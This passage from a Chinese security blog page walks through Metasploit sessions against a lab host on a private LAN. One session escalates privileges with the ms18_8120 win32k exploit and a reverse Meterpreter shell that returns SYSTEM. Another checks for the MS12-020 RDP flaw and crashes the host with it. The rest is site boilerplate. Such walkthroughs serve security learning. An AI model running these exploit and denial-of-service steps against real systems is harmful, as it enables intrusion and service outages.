class="number">.1</span><span class="number">.66</span>)</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/ms18_8120_win32k_privescmsf5 exploit(windows/<span class="keyword">local</span>/ms18_8120_win32k_privesc) &gt; <span class="keyword">show</span> options </span><br><span class="line"></span><br><span class="line"><span class="keyword">Module</span> options (exploit/windows/<span class="keyword">local</span>/ms18_8120_win32k_privesc):</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Name</span>     <span class="keyword">Current</span> Setting  <span class="keyword">Required</span>  Description</span><br><span class="line">   <span class="comment">----     ---------------  --------  -----------</span></span><br><span class="line">   <span class="keyword">SESSION</span>                   yes       The <span class="keyword">session</span> <span class="keyword">to</span> run this <span class="keyword">module</span> on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Id</span>  <span class="keyword">Name</span></span><br><span class="line">   <span class="comment">--  ----</span></span><br><span class="line">   <span class="number">0</span>   <span class="keyword">Automatic</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/<span class="keyword">local</span>/ms18_8120_win32k_privesc) &gt; <span class="keyword">set</span> <span class="keyword">session</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">session</span> =&gt; <span class="number">2</span></span><br><span class="line">msf5 exploit(windows/<span class="keyword">local</span>/ms18_8120_win32k_privesc) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started <span class="keyword">reverse</span> TCP <span class="keyword">handler</span> <span class="keyword">on</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">4444</span> </span><br><span class="line">[+] Exploit finished, <span class="keyword">wait</span> <span class="keyword">for</span> privileged payload execution <span class="keyword">to</span> complete.</span><br><span class="line">[*] Sending stage (<span class="number">179779</span> <span class="keyword">bytes</span>) <span class="keyword">to</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span></span><br><span class="line">[*] Meterpreter <span class="keyword">session</span> <span class="number">3</span> opened (<span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.66</span>:<span class="number">52455</span>) <span class="keyword">at</span> <span class="number">2019</span><span class="number">-01</span><span class="number">-22</span> <span class="number">16</span>:<span class="number">04</span>:<span class="number">23</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"><span class="keyword">Server</span> username: NT AUTHORITY\<span class="keyword">SYSTEM</span></span><br></pre></td></tr></table></figure>
+<h1 id="ms12-020远程蓝屏"><a href="#ms12-020远程蓝屏" class="headerlink" title="ms12-020远程蓝屏"></a>ms12-020远程蓝屏</h1><ol>
+<li><p>检测</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">msf5 auxiliary(scanner/rdp/ms12_020_check) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/rdp/ms12_020_check):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    <span class="literal">yes</span>       The target<span class="built_in"> address </span>range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT    3389             <span class="literal">yes</span>       Remote<span class="built_in"> port </span>running RDP (TCP)</span><br><span class="line">   THREADS  1                <span class="literal">yes</span>       The number of concurrent threads</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/rdp/ms12_020_check) &gt; <span class="builtin-name">set</span> threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf5 auxiliary(scanner/rdp/ms12_020_check) &gt; <span class="builtin-name">set</span> rhosts 192.168.1.66</span><br><span class="line">rhosts =&gt; 192.168.1.66</span><br><span class="line">msf5 auxiliary(scanner/rdp/ms12_020_check) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.66:3389     - 192.168.1.66:3389 - The target is vulnerable.</span><br><span class="line">[*] 192.168.1.66:3389     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/rdp/ms12_020_check) &gt; use auxiliary/dos/windows/rdp/ms12_020_maxchannelids </span><br><span class="line">msf5 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/dos/windows/rdp/ms12_020_maxchannelids):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS                   <span class="literal">yes</span>       The target<span class="built_in"> address </span>range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT   3389             <span class="literal">yes</span>       The target<span class="built_in"> port </span>(TCP)</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; <span class="builtin-name">set</span> rhosts 192.168.1.66</span><br><span class="line">rhosts =&gt; 192.168.1.66</span><br><span class="line">msf5 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.1.66:3389 - 192.168.1.66:3389 - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS</span><br><span class="line">[*] 192.168.1.66:3389 - 192.168.1.66:3389 - 210 bytes sent</span><br><span class="line">[*] 192.168.1.66:3389 - 192.168.1.66:3389 - Checking RDP status<span class="built_in">..</span>.</span><br><span class="line">[+] 192.168.1.66:3389 - 192.168.1.66:3389 seems down</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+    
+	<div>
+	
+		﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+	
+	</div>
+	
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/27/reGeorg-Proxifier内网穿透及提权模拟/" rel="next" title="reGeorg+Proxifier内网穿透及提权模拟">
+                <i class="fa fa-chevron-left"></i> reGeorg+Proxifier内网穿透及提权模拟
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/16/PCTF2019-Writeup/" rel="prev" title="PCTF2019-Writeup">
+                PCTF2019-Writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Cy9nus">
+            
+              <p class="site-author-name" itemprop="name">Cy9nus</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Cy9nusG4rd3n" title="GitHub &rarr; https://github.com/Cy9nusG4rd3n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:595318589@qq.com" title="E-Mail &rarr; mailto:595318589@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/" title="Weibo &rarr; https://weibo.com/" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://plus.google.com/" title="Google &rarr; https://plus.google.com/" rel="noopener" target="_blank"><i class="fa fa-fw fa-google"></i>Google</a>
+                </span>
+              
+            </div>
+          
+		  <div id="music163player">
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34341308&auto=1&height=66"></iframe>
+</div>
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#nmap常见参数"><span class="nav-number">1.</span> <span class="nav-text">nmap常见参数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HOST-DISCOVERY主机发现"><span class="nav-number">1.1.</span> <span class="nav-text">HOST DISCOVERY主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SCAN-TECHNIQUES扫描技术"><span class="nav-number">1.2.</span> <span class="nav-text">SCAN TECHNIQUES扫描技术</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PORT-SPECIFICATION-AND-SCAN-ORDER端口说明和扫描规则"><span class="nav-number">1.3.</span> <span class="nav-text">PORT SPECIFICATION AND SCAN ORDER端口说明和扫描规则</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SERVICE-VERSION-DETECTION服务、版本探测"><span class="nav-number">1.4.</span> <span class="nav-text">SERVICE/VERSION DETECTION服务、版本探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OS-DETECTION系统探测"><span class="nav-number">1.5.</span> <span class="nav-text">OS DETECTION系统探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OUTPUT输出"><span class="nav-number">1.6.</span> <span class="nav-text">OUTPUT输出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC杂项"><span class="nav-number">1.7.</span> <span class="nav-text">MISC杂项</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#msf目录扫描"><span class="nav-number">2.</span> <span class="nav-text">msf目录扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#msf反弹shell（桥接模式下）"><span class="nav-number">3.</span> <span class="nav-text">msf反弹shell（桥接模式下）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用ms18-8120提权"><span class="nav-number">4.</span> <span class="nav-text">利用ms18-8120提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ms12-020远程蓝屏"><span class="nav-number">5.</span> <span class="nav-text">ms12-020远程蓝屏</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cy9nus</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共27.5k字</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="总访客量">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="总访问量">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.6" zindex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.5.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'g6m8NJreyw7EDEGnHk5jtKwq-gzGzoHsz',
+        appKey: 'evJGU4bX7K62eAyT9bH4eNUn',
+        placeholder: '到此一游？',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: false
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
